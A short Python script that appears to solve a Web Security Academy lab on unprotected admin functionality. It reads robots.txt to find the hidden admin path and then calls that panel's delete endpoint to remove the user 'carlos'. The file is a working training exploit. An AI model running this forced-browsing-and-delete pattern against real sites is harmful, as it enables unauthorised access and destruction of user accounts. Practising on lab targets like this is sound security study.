#!/usr/bin/env python3
"""Unprotected admin functionality"""

import os

import requests


class Lab:
    """Wrapper"""

    def __init__(self) -> None:
        lab_id = os.environ["LAB_ID"]
        self.url = f"https://{lab_id}.web-security-academy.net"

    # pylint: disable=no-self-use # we override it later
    def get(self, url: str, params: dict | None = None) -> requests.models.Response:
        """Get URL"""
        return requests.get(url, params=params)

    def robots(self) -> requests.models.Response:
        """Get robots.txt"""
        return self.get(url=f"{self.url}/robots.txt")

    def disallowed(self) -> str:
        """Get the only disallowed path"""
        robots = self.robots()
        robots.raise_for_status()
        disallowed = set()
        for line in robots.text.splitlines():
            if "Disallow: " in line:
                disallowed.add(line.split("Disallow: ")[1])
        if len(disallowed) == 1:
            return disallowed.pop()
        raise RuntimeError("Assumed there was only one disallowed path")

    def delete_user(self, admin_panel: str, username: str) -> requests.models.Response:
        """Delete a given user"""
        url = f"{self.url}{admin_panel}/delete"
        payload = {"username": username}
        response = self.get(url=url, params=payload)
        response.raise_for_status()
        return response


def main() -> None:
    """Entry point"""
    site = Lab()
    admin_panel = site.disallowed()
    print(admin_panel)
    site.delete_user(admin_panel=admin_panel, username="carlos")


if __name__ == "__main__":
    main()
